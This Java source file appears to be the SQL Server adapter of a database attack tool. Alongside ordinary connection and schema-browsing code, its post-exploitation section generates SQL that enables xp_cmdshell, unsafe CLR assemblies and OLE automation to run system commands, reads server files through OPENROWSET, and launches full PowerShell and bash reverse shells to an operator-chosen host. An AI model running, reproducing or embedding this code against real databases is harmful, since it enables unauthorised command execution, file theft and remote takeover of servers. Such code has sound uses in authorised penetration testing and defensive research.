package database;

import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;
import util.SqlHelpers;

import java.sql.*;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * SQL Server 适配器（JDBC + HikariCP 连接池）。
 *
 * <p>TLS 策略：默认 encrypt=true + trustServerCertificate=true（强制加密、不校验证书链），
 * 服务端不支持时回退 encrypt=false 并记录提示。
 */
public class mssql implements DatabaseAdapter {

    private static final Logger LOG = Logger.getLogger(mssql.class.getName());
    private static final int QUERY_TIMEOUT_SECONDS = 30;

    private final String host;
    private final String port;
    private final String database;
    private final String username;
    private final String password;

    private HikariDataSource pool = null;
    private Boolean tlsSupported = null;

    public mssql(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = port;
        this.database = database;
        this.username = username;
        this.password = password;
        // 显式注册 SQL Server JDBC 驱动，避免打包环境未自动加载
        try {
            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
        } catch (ClassNotFoundException e) {
            LOG.log(Level.SEVERE, "[!] SQL Server JDBC 驱动未找到: " + e.getMessage(), e);
        }
    }

    // ----------------------------------------------------------- 连接与池化

    private static String safeName(String s) {
        return (s == null || s.isEmpty()) ? "master" : s.replaceAll("[^A-Za-z0-9_$.-]", "");
    }

    private String baseUrl(boolean tls) {
        return "jdbc:sqlserver://" + host + ":" + port + ";databaseName=" + safeName(database)
                + (tls
                ? ";encrypt=true;trustServerCertificate=true"
                : ";encrypt=false;trustServerCertificate=true")
                + ";loginTimeout=15";
    }

    /** 探测 TLS（encrypt=true）可用性；失败回退 encrypt=false。返回最终 URL。 */
    private synchronized String effectiveUrl() {
        if (tlsSupported == null) {
            try (Connection tmp = DriverManager.getConnection(baseUrl(true), username, password)) {
                tlsSupported = Boolean.TRUE;
                LOG.info("[+] MSSQL TLS 连接成功（encrypt=true）");
            } catch (SQLException e) {
                tlsSupported = Boolean.FALSE;
                LOG.warning("[!] MSSQL TLS 不可用，回退 encrypt=false: " + e.getMessage());
            }
        }
        return tlsSupported ? baseUrl(true) : baseUrl(false);
    }

    private synchronized HikariDataSource pool() {
        if (pool == null || pool.isClosed()) {
            HikariConfig cfg = new HikariConfig();
            cfg.setJdbcUrl(effectiveUrl());
            cfg.setUsername(username);
            cfg.setPassword(password);
            cfg.setPoolName("turacos-mssql-" + host + ":" + port);
            cfg.setMaximumPoolSize(4);
            cfg.setMinimumIdle(1);
            cfg.setConnectionTimeout(15000);
            cfg.setValidationTimeout(5000);
            cfg.setAutoCommit(true);
            pool = new HikariDataSource(cfg);
        }
        return pool;
    }

    private Connection getConnection() throws SQLException {
        return pool().getConnection();
    }

    @Override
    public void close() {
        if (pool != null) {
            pool.close();
            pool = null;
        }
    }

    // ------------------------------------------------------------- 接口方法

    @Override
    public boolean testConnection() {
        try (Connection tmp = DriverManager.getConnection(effectiveUrl(), username, password)) {
            return tmp != null && !tmp.isClosed();
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 连接测试失败: " + e.getMessage());
            return false;
        }
    }

    @Override
    public List<String> getDatabases() {
        List<String> dbs = new ArrayList<>();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")) {
            while (rs.next()) dbs.add(rs.getString(1));
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[-] 获取数据库列表失败: " + e.getMessage());
        }
        return dbs;
    }

    @Override
    public List<String> getSchemas() {
        List<String> schemas = new ArrayList<>();
        String sql = "SELECT name FROM sys.schemas ORDER BY name";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql);
             ResultSet rs = ps.executeQuery()) {
            while (rs.next()) schemas.add(rs.getString(1));
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取模式列表失败: " + e.getMessage());
        }
        return schemas;
    }

    @Override
    public List<String> getTables(String schema) {
        List<String> tables = new ArrayList<>();
        String sql = "SELECT t.name FROM sys.tables t JOIN sys.schemas s ON t.schema_id = s.schema_id WHERE s.name = ? ORDER BY t.name";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setString(1, schema);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) tables.add(rs.getString(1));
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取表列表失败: " + e.getMessage());
        }
        return tables;
    }

    @Override
    public List<String> getColumnNames(String schema, String table) {
        List<String> cols = new ArrayList<>();
        String sql = "SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id = t.object_id JOIN sys.schemas s ON t.schema_id = s.schema_id WHERE s.name = ? AND t.name = ? ORDER BY c.column_id";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setString(1, schema);
            ps.setString(2, table);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) cols.add(rs.getString(1));
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取列信息失败: " + e.getMessage());
        }
        return cols;
    }

    @Override
    public List<List<Object>> getTopRows(String schema, String table, int limit) {
        List<List<Object>> rows = new ArrayList<>();
        int safeLimit = SqlHelpers.clampLimit(limit);
        // 标识符安全引用；limit 来自代码内常量(非用户输入)
        String sql = "SELECT TOP " + safeLimit + " * FROM " + SqlHelpers.quoteMs(schema) + "." + SqlHelpers.quoteMs(table);
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql);
             ResultSet rs = ps.executeQuery()) {
            ResultSetMetaData meta = rs.getMetaData();
            int colCount = meta.getColumnCount();
            while (rs.next()) {
                List<Object> row = new ArrayList<>();
                for (int i = 1; i <= colCount; i++) row.add(rs.getObject(i));
                rows.add(row);
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 查询表数据失败: " + e.getMessage());
        }
        return rows;
    }

    /**
     * 执行任意 SQL（支持多语句/多结果集）：整串发送 + 逐结果集迭代。
     */
    @Override
    public String executeSQL(String sql) throws SQLException {
        if (sql == null || sql.trim().isEmpty()) return "[!] SQL语句不能为空！";
        long t0 = System.currentTimeMillis();
        StringBuilder sb = new StringBuilder();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {
            stmt.setQueryTimeout(QUERY_TIMEOUT_SECONDS);
            boolean hasResultSet = stmt.execute(sql.trim());
            while (true) {
                if (hasResultSet) {
                    try (ResultSet rs = stmt.getResultSet()) {
                        ResultSetMetaData meta = rs.getMetaData();
                        int colCount = meta.getColumnCount();
                        while (rs.next()) {
                            for (int i = 1; i <= colCount; i++) {
                                String val = rs.getString(i);
                                if (i > 1) sb.append("\t");
                                sb.append(val != null ? val : "NULL");
                            }
                            sb.append("\n");
                        }
                    }
                } else {
                    int updateCount = stmt.getUpdateCount();
                    if (updateCount == -1) break;
                }
                hasResultSet = stmt.getMoreResults();
            }
        } catch (SQLTimeoutException te) {
            return audited("EXEC_SQL", sql, "[!] SQL 执行超时: " + te.getMessage() + "\n" + sb, t0);
        } catch (SQLException e) {
            if (sb.length() > 0) sb.append("\n");
            sb.append("[-] ").append(e.getMessage());
        }
        return audited("EXEC_SQL", sql, sb + "\n", t0);
    }

    /** 结构化查询（供合规检查等模块使用）：返回 列名->值 的行列表。 */
    @Override
    public List<Map<String, Object>> queryRows(String sql, String... params) throws SQLException {
        List<Map<String, Object>> rows = new ArrayList<>();
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            for (int i = 0; i < params.length; i++) {
                ps.setString(i + 1, params[i]);
            }
            try (ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int n = meta.getColumnCount();
                while (rs.next()) {
                    Map<String, Object> row = new LinkedHashMap<>();
                    for (int i = 1; i <= n; i++) {
                        row.put(meta.getColumnLabel(i), rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        }
        return rows;
    }

    private String audited(String action, String detail, String result, long t0) {
        util.AuditLogger.log(action, "MSSQL", host, port, database, username, detail, result,
                System.currentTimeMillis() - t0);
        return result;
    }

    @Override
    public String getDatabaseInfo() {
        StringBuilder sb = new StringBuilder();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {
            try (ResultSet rs = stmt.executeQuery("SELECT @@VERSION")) {
                if (rs.next()) sb.append("[+] Database Version: ").append(rs.getString(1)).append("\n");
            }
            try (ResultSet rs = stmt.executeQuery("SELECT SUSER_NAME()")) {
                if (rs.next()) sb.append("[+] Current User: ").append(rs.getString(1)).append("\n");
            }
            try (ResultSet rs = stmt.executeQuery("SELECT CAST(SERVERPROPERTY('InstanceDefaultDataPath') AS NVARCHAR(4000))")) {
                if (rs.next()) sb.append("[+] Data directory: ").append(rs.getString(1)).append("\n");
            }
        } catch (SQLException e) {
            sb.append("[-] 获取数据库信息失败: ").append(e.getMessage()).append("\n");
        }
        return sb.toString();
    }

    // ------------------------------------------------------------ 后渗透辅助

    /**
     * 生成执行系统命令的 SQL（UDF 风格对齐）
     * 支持：xp_cmdshell（默认）/ CLR / OLE
     */
    public static String exCmd(String type, String cmd) {
        if (cmd == null || cmd.trim().isEmpty()) {
            cmd = "whoami";
        }
        String safeCmd = cmd.replace("'", "''");

        String xp = """
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;
                EXEC xp_cmdshell '%s';
                """;

        if (type == null || type.isEmpty() || "xp_cmdshell".equalsIgnoreCase(type)) {
            return String.format(xp, safeCmd);
        }

        if ("CLR".equalsIgnoreCase(type)) {
            String clr = """
                    EXEC sp_configure 'show advanced options', 1;
                    RECONFIGURE;
                    EXEC sp_configure 'clr enabled', 1;
                    RECONFIGURE;
                    EXEC sp_configure 'clr strict security', 0;
                    RECONFIGURE;

                    BEGIN TRY
                        -- 若未安装程序集则尝试安装
                        IF NOT EXISTS (SELECT 1 FROM sys.assemblies WHERE name = 'ClrExec')
                        BEGIN
                            DECLARE @dll NVARCHAR(4000) = NULL;

                            -- 先尝试常见路径（可能抛错，置于 TRY 中）
                            BEGIN TRY
                                IF EXISTS (SELECT 1 FROM OPENROWSET(BULK 'C\\Windows\\Temp\\ClrExec.dll', SINGLE_BLOB) AS x)
                                    SET @dll = 'C\\Windows\\Temp\\ClrExec.dll';
                            END TRY BEGIN CATCH END CATCH;

                            IF @dll IS NULL
                            BEGIN TRY
                                IF EXISTS (SELECT 1 FROM OPENROWSET(BULK '/tmp/ClrExec.dll', SINGLE_BLOB) AS x)
                                    SET @dll = '/tmp/ClrExec.dll';
                            END TRY BEGIN CATCH END CATCH;

                            -- 再用 xp_fileexist 兜底检测
                            IF @dll IS NULL
                            BEGIN
                                DECLARE @exists INT;
                                EXEC master.dbo.xp_fileexist 'C\\Windows\\Temp\\ClrExec.dll', @exists OUT;
                                IF @exists = 1 SET @dll = 'C\\Windows\\Temp\\ClrExec.dll';
                                ELSE
                                BEGIN
                                    EXEC master.dbo.xp_fileexist '/tmp/ClrExec.dll', @exists OUT;
                                    IF @exists = 1 SET @dll = '/tmp/ClrExec.dll';
                                END
                            END

                            IF @dll IS NULL
                            BEGIN
                                PRINT '[-] 未找到 CLR DLL，请将 ClrExec.dll（参考 src/main/resources/mssql/clr/ClrExec.cs 自行编译）放到 C:\\Windows\\Temp 或 /tmp';
                            END
                            ELSE
                            BEGIN
                                DECLARE @sql NVARCHAR(MAX) = 'CREATE ASSEMBLY [ClrExec] FROM ''' + @dll + ''' WITH PERMISSION_SET = UNSAFE;';
                                EXEC (@sql);
                            END
                        END

                        -- 创建过程（命名：dbo.clr_exec），映射到程序集中的 StoredProcedures.Exec
                        IF NOT EXISTS (SELECT 1 FROM sys.procedures WHERE name = 'clr_exec')
                        BEGIN
                            EXEC ('CREATE PROCEDURE [dbo].[clr_exec] (@cmd NVARCHAR(MAX)) AS EXTERNAL NAME [ClrExec].[StoredProcedures].[Exec]');
                        END
                    END TRY
                    BEGIN CATCH
                        PRINT '[-] CLR 安装失败: ' + ERROR_MESSAGE();
                    END CATCH;

                    -- 执行命令
                    EXEC [dbo].[clr_exec] N'%s';
                    """;
            return String.format(clr, safeCmd);
        }

        if ("OLE".equalsIgnoreCase(type)) {
            String ole = """
                    EXEC sp_configure 'show advanced options', 1;
                    RECONFIGURE;
                    EXEC sp_configure 'Ole Automation Procedures', 1;
                    RECONFIGURE;
                    DECLARE @shell INT;
                    EXEC sp_OACreate 'WScript.Shell', @shell OUT;
                    EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c %s', 0, TRUE;
                    EXEC sp_OADestroy @shell;
                    """;
            return String.format(ole, safeCmd);
        }

        return String.format(xp, safeCmd);
    }

    /**
     * 生成读取文件内容的 SQL
     * 支持：OPENROWSET（SINGLE_CLOB）与 xp_cmdshell 回退。
     */
    public static String readFiles(String path, String type) {
        if (path == null || path.trim().isEmpty()) {
            path = "C:/Windows/win.ini";
        }
        String safePath = path.replace("'", "''");

        String openrowset = "SELECT BulkColumn FROM OPENROWSET(BULK '%s', SINGLE_CLOB) AS x;";
        String shell = """
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;
                EXEC xp_cmdshell 'type %s';
                """;
        String dirtree = "EXEC xp_dirtree '%s', 1, 1;";

        if (type == null || type.isEmpty()) type = "OPENROWSET";

        if ("OPENROWSET".equalsIgnoreCase(type)) {
            return String.format(openrowset, safePath);
        } else if ("xp_cmdshell".equalsIgnoreCase(type)) {
            return String.format(shell, safePath);
        } else if ("DIR_LIST".equalsIgnoreCase(type)) {
            return String.format(dirtree, safePath);
        }

        return String.format(openrowset, safePath);
    }

    private String detectOS() {
        try (Connection c = getConnection();
             Statement stmt = c.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT @@VERSION")) {
            String ver = rs.next() ? rs.getString(1).toLowerCase() : "";
            if (ver.contains("windows")) return "windows";
            if (ver.contains("linux")) return "linux";
            return "unknown";
        } catch (SQLException e) {
            return "unknown";
        }
    }

    public boolean reverseShell(String host, int port) {
        if (host == null || host.trim().isEmpty()) return false;
        if (port < 1 || port > 65535) return false;

        String os = detectOS();
        String cmd;
        if ("windows".equals(os)) {
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"";
        } else if ("linux".equals(os)) {
            cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'";
        } else {
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"";
        }

        try {
            String sql = exCmd("xp_cmdshell", cmd);
            if (!sql.isEmpty()) {
                executeSQL(sql);
                return true;
            }

            sql = exCmd("OLE", cmd);
            if (!sql.isEmpty()) {
                executeSQL(sql);
                return true;
            }

            sql = exCmd("CLR", cmd);
            if (!sql.isEmpty()) {
                executeSQL(sql);
                return true;
            }

            return false;
        } catch (Exception e) {
            LOG.log(Level.INFO, "[!] " + e.getMessage());
            return false;
        }
    }
}
